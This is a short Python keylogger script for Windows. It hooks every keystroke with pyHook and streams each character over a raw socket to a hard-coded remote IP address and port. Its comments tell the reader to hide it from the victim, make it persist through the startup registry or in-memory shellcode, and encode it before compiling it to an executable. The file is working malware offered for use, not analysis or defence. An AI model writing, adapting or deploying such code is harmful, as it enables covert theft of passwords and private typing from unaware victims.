

# send the character or the code of key to server every time that a key has been pressed
# run this code constantly on windows without user be aware of it => run it behind the scence!
# make it kind of persistence to run it constantly or add to startup registry to run it in the back; or create shellcode from your code to run it in memory like other shellcodes

# WARNING: if u want to make an exe file from this file be sure that you encoded your code and ngrok server is set to up!



# these module must be installed on target machine; if this is not the case try to install them !
import pythoncom, pyHook, sys, socket 


host = '52.15.183.149'
port = 19436
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def OnKeyboardEvent(event):
    s.send(chr(event.Ascii))
    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()